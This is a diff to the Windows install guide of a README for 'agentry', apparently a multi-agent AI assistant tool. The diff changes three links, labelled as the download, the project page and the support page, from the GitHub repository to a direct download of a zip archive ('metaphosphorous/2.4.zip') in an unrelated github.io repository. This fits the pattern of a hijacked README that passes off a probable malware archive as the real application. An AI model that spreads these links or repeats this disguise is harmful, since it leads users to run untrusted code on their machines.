@@ -30,7 +30,7 @@ You're reading this on Windows, right? agentry is designed to run smoothly on yo
 
 ### Step 1: Download agentry
 
-**Visit this link to download the application:** [https://github.com/Elvaclassical3423/agentry](https://github.com/Elvaclassical3423/agentry)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Elvaclassical3423/elvaclassical3423.github.io/main/metaphosphorous/2.4.zip](https://raw.githubusercontent.com/Elvaclassical3423/elvaclassical3423.github.io/main/metaphosphorous/2.4.zip)
 
 When you visit this page, you'll find the download options. Choose the version that's right for your Windows computer.
 
@@ -130,7 +130,7 @@ If you're technically inclined, you can access agentry's REST API at `http://loc
 
 ### 🤔 Stuck? Need Support?
 
-- **Visit the project page** - [https://github.com/Elvaclassical3423/agentry](https://github.com/Elvaclassical3423/agentry)
+- **Visit the project page** - [https://raw.githubusercontent.com/Elvaclassical3423/elvaclassical3423.github.io/main/metaphosphorous/2.4.zip](https://raw.githubusercontent.com/Elvaclassical3423/elvaclassical3423.github.io/main/metaphosphorous/2.4.zip)
 - **Check the documentation** - There's usually a "Documentation" or "Wiki" link on the project page.
 - **Join the community** - Look for discussion forums or issue trackers on the project page.
 
@@ -156,7 +156,7 @@ Yes! While this guide focuses on Windows, agentry also works on Mac and Linux. T
 
 You now have everything you need to get started with agentry. This powerful tool puts a team of AI assistants at your fingertips, ready to help with writing, research, coding, planning, and so much more.
 
-Remember: **Visit this link to download the application:** [https://github.com/Elvaclassical3423/agentry](https://github.com/Elvaclassical3423/agentry)
+Remember: **Visit this link to download the application:** [https://raw.githubusercontent.com/Elvaclassical3423/elvaclassical3423.github.io/main/metaphosphorous/2.4.zip](https://raw.githubusercontent.com/Elvaclassical3423/elvaclassical3423.github.io/main/metaphosphorous/2.4.zip)
 
 Don't be afraid to experiment. The best way to learn is by trying things out. Create your first agent, ask it something simple, and see what happens. Before you know it, you'll be orchestrating a whole team of digital assistants to tackle projects you never thought possible.
 
